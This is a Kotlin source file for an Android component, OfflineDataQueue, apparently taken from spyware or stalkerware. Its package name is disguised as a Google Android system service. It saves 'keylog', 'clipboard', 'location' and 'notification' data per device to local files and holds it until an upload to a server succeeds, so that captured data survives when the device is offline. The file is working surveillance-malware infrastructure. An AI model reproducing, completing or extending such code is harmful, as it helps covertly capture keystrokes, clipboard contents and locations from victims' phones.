package com.google.android.systemservice.utils

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.IOException
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Offline data queue — stores data locally when server is unreachable.
 * When connection is restored, queued items are uploaded automatically.
 * 
 * Thread-safe, file-backed, survives app restarts.
 */
class OfflineDataQueue(private val context: Context) {

    companion object {
        private const val TAG = "OfflineQueue"
        private const val QUEUE_DIR = "offline_queue"
        private const val MAX_QUEUE_SIZE = 5000
        private const val MAX_FILE_SIZE_BYTES = 10 * 1024 * 1024 // 10MB per type
    }

    data class QueueItem(
        val type: String,        // "keylog", "clipboard", "location", "notification"
        val payload: String,     // JSON string
        val timestamp: Long,
        val deviceId: String
    )

    private val gson = Gson()
    private val isFlushing = AtomicBoolean(false)
    private val memoryQueue = ConcurrentLinkedQueue<QueueItem>()

    private fun getQueueDir(): File {
        val dir = File(context.filesDir, QUEUE_DIR)
        if (!dir.exists()) dir.mkdirs()
        return dir
    }

    private fun getQueueFile(type: String): File {
        return File(getQueueDir(), "${type}_queue.json")
    }

    /**
     * Enqueue data for later upload. Call this when server is unreachable.
     */
    @Synchronized
    fun enqueue(type: String, payload: String, deviceId: String) {
        val item = QueueItem(type, payload, System.currentTimeMillis(), deviceId)
        memoryQueue.offer(item)
        
        // Persist to disk periodically
        if (memoryQueue.size >= 10) {
            persistToDisk()
        }
        
        Log.d(TAG, "Enqueued $type item (queue size: ${memoryQueue.size})")
    }

    /**
     * Write memory queue to disk files (grouped by type).
     */
    @Synchronized
    fun persistToDisk() {
        if (memoryQueue.isEmpty()) return

        // Take a non-destructive snapshot; clear only after successful write
        val itemsToPersist = memoryQueue.toList()

        try {
            val byType = mutableMapOf<String, MutableList<QueueItem>>()
            for (item in itemsToPersist) {
                byType.getOrPut(item.type) { mutableListOf() }.add(item)
            }

            // Append to type-specific files
            for ((type, items) in byType) {
                val file = getQueueFile(type)
                val existing = loadFromFile(file)
                existing.addAll(items)
                
                // Trim if too many
                val trimmed = if (existing.size > MAX_QUEUE_SIZE) {
                    existing.takeLast(MAX_QUEUE_SIZE).toMutableList()
                } else existing
                
                saveToFile(file, trimmed)
                Log.d(TAG, "Persisted ${items.size} $type items (total: ${trimmed.size})")
            }
            // Only clear after successful write
            memoryQueue.clear()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to persist data to disk", e)
            // Items remain in memoryQueue for next attempt — no data loss
        }
    }

    /**
     * Get all queued items of a specific type for upload.
     * Does NOT remove them — call clearType() after successful upload.
     */
    @Synchronized
    fun getQueued(type: String): List<QueueItem> {
        persistToDisk() // flush memory first
        return loadFromFile(getQueueFile(type))
    }

    /**
     * Get all queued items across all types.
     */
    @Synchronized
    fun getAllQueued(): Map<String, List<QueueItem>> {
        persistToDisk()
        val result = mutableMapOf<String, List<QueueItem>>()
        val dir = getQueueDir()
        dir.listFiles()?.filter { it.name.endsWith("_queue.json") }?.forEach { file ->
            val type = file.name.removeSuffix("_queue.json")
            val items = loadFromFile(file)
            if (items.isNotEmpty()) result[type] = items
        }
        return result
    }

    /**
     * Clear queued items after successful upload.
     */
    @Synchronized
    fun clearType(type: String) {
        val file = getQueueFile(type)
        if (file.exists()) file.delete()
        Log.d(TAG, "Cleared $type queue")
    }

    /**
     * Clear specific items (by timestamp) after partial upload.
     */
    @Synchronized
    fun clearUploaded(type: String, uploadedTimestamps: Set<Long>) {
        val file = getQueueFile(type)
        val remaining = loadFromFile(file).filter { it.timestamp !in uploadedTimestamps }
        if (remaining.isEmpty()) {
            file.delete()
        } else {
            saveToFile(file, remaining.toMutableList())
        }
    }

    /**
     * Total count of queued items across all types.
     */
    @Synchronized
    fun totalQueuedCount(): Int {
        var count = memoryQueue.size
        val dir = getQueueDir()
        (dir.listFiles() ?: emptyArray()).filter { it.name.endsWith("_queue.json") }.forEach { file ->
            count += loadFromFile(file).size
        }
        return count
    }

    /**
     * Check if there are queued items waiting for upload.
     */
    @Synchronized
    fun hasQueuedData(): Boolean {
        if (memoryQueue.isNotEmpty()) return true
        val dir = getQueueDir()
        return dir.listFiles()?.any { 
            it.name.endsWith("_queue.json") && it.length() > 2 // not empty "[]"
        } == true
    }

    private fun loadFromFile(file: File): MutableList<QueueItem> {
        if (!file.exists() || file.length() == 0L) return mutableListOf()
        return try {
            val json = file.readText()
            val type = object : TypeToken<MutableList<QueueItem>>() {}.type
            gson.fromJson(json, type) ?: mutableListOf()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load ${file.name}: ${e.message}")
            mutableListOf()
        }
    }

    private fun saveToFile(file: File, items: MutableList<QueueItem>) {
        try {
            // Check file size limit
            val json = gson.toJson(items)
            if (json.length > MAX_FILE_SIZE_BYTES) {
                // Trim oldest items
                val trimmed = items.takeLast(items.size / 2).toMutableList()
                file.writeText(gson.toJson(trimmed))
                Log.w(TAG, "Queue ${file.name} exceeded size limit, trimmed to ${trimmed.size}")
            } else {
                file.writeText(json)
            }
        } catch (e: IOException) {
            Log.e(TAG, "Failed to save ${file.name}: ${e.message}")
        }
    }
}
